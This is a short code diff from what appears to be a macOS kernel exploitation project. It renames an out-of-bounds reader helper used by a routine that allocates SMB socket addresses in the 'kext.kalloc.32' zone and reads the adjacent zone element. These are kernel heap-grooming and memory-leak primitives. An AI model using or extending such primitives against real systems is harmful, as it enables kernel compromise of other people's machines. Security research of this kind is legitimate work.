@@ -24,7 +24,7 @@
 #include "../smb/ssn_allocator.h"
 
 #include "zkext_alloc_small.h"
-#include "kmem_oob_reader.h"
+#include "oob_reader_base.h"
 #include "allocator_rw.h"
 #include "allocator_prpw.h"
 
@@ -142,7 +142,7 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, uint8_t alloc
         uint32_t local_name_size = snb_name;
         char local_nb_name[local_name_size];
         
-        struct kmem_oob_reader_args params;
+        struct oob_reader_base_args params;
         params.smb_addr = *smb_addr;
         params.saddr_snb_len = nb_len;
         params.saddr_ioc_len = ioc_len;
@@ -152,7 +152,7 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, uint8_t alloc
         params.laddr_snb_name_seglen = snb_name;
         
         /// Allocate saddr and laddr in `kext.kalloc.32` zone and read their succeeding zone element
-        kmem_oob_reader_read(&params, server_nb_name, &server_name_size, local_nb_name, &local_name_size);
+        oob_reader_base_read(&params, server_nb_name, &server_name_size, local_nb_name, &local_name_size);
         xe_assert_cond(server_name_size, ==, snb_name + 2);
         xe_assert_cond(local_name_size, ==, snb_name + 2);
         
